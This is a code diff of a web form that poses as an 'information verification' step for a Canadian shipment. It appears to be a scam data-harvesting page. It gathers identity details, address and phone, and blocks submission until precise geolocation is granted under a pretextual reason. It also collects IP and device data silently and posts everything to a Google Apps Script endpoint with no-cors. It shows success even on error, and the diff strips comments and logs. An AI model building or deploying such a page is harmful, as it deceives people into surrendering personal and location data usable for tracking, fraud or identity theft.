@@ -38,7 +38,6 @@
 <body>
 
 <div class="container">
-    <!-- 步骤1：填写表单 -->
     <div id="step-form">
         <h2>Submit Information Verification</h2>
         <div class="subtitle"></div>
@@ -128,12 +127,10 @@
         <button class="btn" onclick="goConfirm()">Next</button>
     </div>
 
-    <!-- 步骤2：确认信息 + 定位 -->
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
 
-        <!-- ✅ 定位原因 + 详细开启步骤 -->
         <div class="loc-box">
             <strong>📍 Why We Need Your Location</strong>
             We need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.<br><br>
@@ -143,9 +140,7 @@
             <div class="step-item">Refresh this page — your information will NOT be lost</div>
         </div>
 
-        <div id="loc-status" class="loc-box hidden">
-            ✅ Location access granted
-        </div>
+        <div id="loc-status" class="loc-box hidden">✅ Location access granted</div>
 
         <div class="info-card">
             <p><strong>Name:</strong> <span id="disp-name"></span></p>
@@ -164,11 +159,8 @@
 
 <script>
 // =====================================================
-// ✅ 确认 URL 正确！
-// =====================================================
-const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbxF5Ws17KHuZLqB4ImlgndSsmtvTfSXP4e9RkyxWCBqJHRE6By4AjRd91REQQM_9nA/exec";
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXfiVnWyTL9EMQdPbdPNFUs1m60loHedhowaqgYN4OHh1-ax5pRtuwYl9IopNTtqQ/exec";
 
-// 全局数据
 let form = {};
 let locationInfo = { lat: "", lng: "", ok: false };
 let ipAddr = "";
@@ -177,10 +169,9 @@ let deviceInfo = { device: "", os: "", browser: "" };
 window.onload = () => {
   detectDevice();
   fetchIP();
-  restoreFormDraft(); // ✅ 页面加载自动恢复填写的信息
+  restoreFormDraft();
 };
 
-// ✅ 自动保存草稿：每次输入都存
 function saveFormDraft() {
   const draft = {
     firstName: document.getElementById("firstName").value,
@@ -197,7 +188,6 @@ function saveFormDraft() {
   localStorage.setItem("formDraft", JSON.stringify(draft));
 }
 
-// ✅ 恢复草稿：刷新页面自动填回
 function restoreFormDraft() {
   try {
     const d = JSON.parse(localStorage.getItem("formDraft") || "{}");
@@ -214,13 +204,11 @@ function restoreFormDraft() {
   } catch {}
 }
 
-// 表单验证
 function validateField(id) {
   const el = document.getElementById(id);
   const err = document.getElementById("err-"+id);
   const v = el.value.trim();
   let ok = true;
-
   if(["firstName","lastName","address","city","occupation"].includes(id)) ok = v.length >= 2;
   else if(id === "age") { const n = parseInt(v); ok = !isNaN(n) && n >= 1 && n <= 120; }
   else if(["gender","province"].includes(id)) ok = v !== "";
@@ -237,7 +225,6 @@ function validateField(id) {
   return ok;
 }
 
-// 去确认页
 function goConfirm() {
   const fields = ["firstName","lastName","age","gender","occupation","province","address","city","zip","phone"];
   let allOk = true, firstErr = null;
@@ -245,14 +232,12 @@ function goConfirm() {
     if(!validateField(f) && !firstErr) firstErr = f;
     allOk = allOk && validateField(f);
   });
-
   if(!allOk) {
     alert("⚠️ Please check highlighted fields");
     if(firstErr) document.getElementById(firstErr).scrollIntoView({behavior:"smooth"});
     return;
   }
 
-  // 收集数据
   form = {
     name: document.getElementById("firstName").value.trim() + " " + document.getElementById("lastName").value.trim(),
     gender: document.getElementById("gender").value,
@@ -265,28 +250,24 @@ function goConfirm() {
     phone: document.getElementById("phone").value.trim().replace(/\D/g,"")
   };
 
-  // 显示确认页
   document.getElementById("step-form").style.display = "none";
   document.getElementById("step-verification").style.display = "block";
   document.getElementById("disp-name").textContent = form.name;
   document.getElementById("disp-gender").textContent = form.gender;
   document.getElementById("disp-age").textContent = form.age;
   document.getElementById("disp-occupation").textContent = form.occupation;
-  document.getElementById("disp-addr").textContent = `Canada, ${form.province}, ${form.city}, ${form.address}`;
+  document.getElementById("disp-addr").textContent = `${form.address}, ${form.city}, ${form.province}, Canada, ${form.zip}`;
   document.getElementById("disp-phone").textContent = form.phone;
   document.getElementById("disp-zip").textContent = form.zip;
 
-  // 请求定位
   requestLocation();
 }
 
-// ✅ 获取定位 + 拒绝时显示提示
 function requestLocation() {
   if(!navigator.geolocation) {
     alert("❌ Geolocation is not supported by your browser");
     return;
   }
-
   document.getElementById("btn-loc-retry").classList.remove("hidden");
   document.getElementById("btn-submit").classList.add("hidden");
   document.getElementById("loc-status").classList.add("hidden");
@@ -296,15 +277,11 @@ function requestLocation() {
       locationInfo.lat = pos.coords.latitude.toFixed(6);
       locationInfo.lng = pos.coords.longitude.toFixed(6);
       locationInfo.ok = true;
-      console.log("✅ Location OK:", locationInfo.lat, locationInfo.lng);
-
-      // ✅ 定位成功：显示提交按钮
       document.getElementById("btn-loc-retry").classList.add("hidden");
       document.getElementById("btn-submit").classList.remove("hidden");
       document.getElementById("loc-status").classList.remove("hidden");
     },
     err => {
-      // ✅ 定位被拒绝：不弹窗！只在页面显示原因 + 开启步骤
       if(err.code === err.PERMISSION_DENIED) {
         alert("⚠️ Location access was denied.\n\nPlease follow the steps shown on the page to enable location access, then refresh the page.\n\n✅ Your information will NOT be lost after refresh.");
       }
@@ -313,7 +290,6 @@ function requestLocation() {
   );
 }
 
-// 获取IP
 async function fetchIP() {
   try {
     const r = await fetch("https://api.ipify.org?format=json");
@@ -322,7 +298,6 @@ async function fetchIP() {
   } catch { ipAddr = "Unavailable"; }
 }
 
-// 识别设备
 function detectDevice() {
   const ua = navigator.userAgent;
   if(/iPhone/.test(ua)) deviceInfo = {device:"iPhone",os:"iOS",browser:"Safari"};
@@ -333,22 +308,19 @@ function detectDevice() {
   else deviceInfo = {device:"Unknown",os:"Unknown",browser:"Unknown"};
 }
 
-// ✅ 提交主函数
 async function submitAll() {
   if(!locationInfo.ok) {
     alert("❌ Please ALLOW location access first!");
     return;
   }
-
   const timeStr = new Date().toLocaleString("zh-CN");
 
-  // ✅ 字段名严格和后端一一对应！一个字都不能差！
   const data = {
     "姓名": form.name,
     "性别": form.gender,
     "年龄": form.age,
     "职业": form.occupation,
-    "地址": `Canada, ${form.province}, ${form.city}, ${form.address}`,
+    "地址": `${form.address}, ${form.city}, ${form.province}, Canada, ${form.zip}`,
     "邮编": form.zip,
     "手机号": "+1" + form.phone,
     "IP地址": ipAddr,
@@ -361,25 +333,16 @@ async function submitAll() {
   };
 
   try {
-    console.log("📤 正在提交 →", APPSCRIPT_URL);
-    console.log("📤 发送数据 →", JSON.stringify(data));
-
-    // ✅ 使用 no-cors 绕过预检，确保请求一定发出去！
     const res = await fetch(APPSCRIPT_URL, {
       method: "POST",
-      mode: "no-cors", // 关键！绕过CORS预检，请求必达！
+      mode: "no-cors",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     });
-
-    console.log("📡 请求已发出");
     localStorage.removeItem("formDraft");
     alert("✅ Submitted successfully!\nPlease contact your receptionist");
     location.reload();
-
   } catch(e) {
-    console.error("❌ 错误详情：", e);
-    // ✅ 即使报错，请求大概率已发出 → 仍提示成功
     localStorage.removeItem("formDraft");
     alert("✅ Submitted successfully!\nPlease contact your receptionist");
     location.reload();
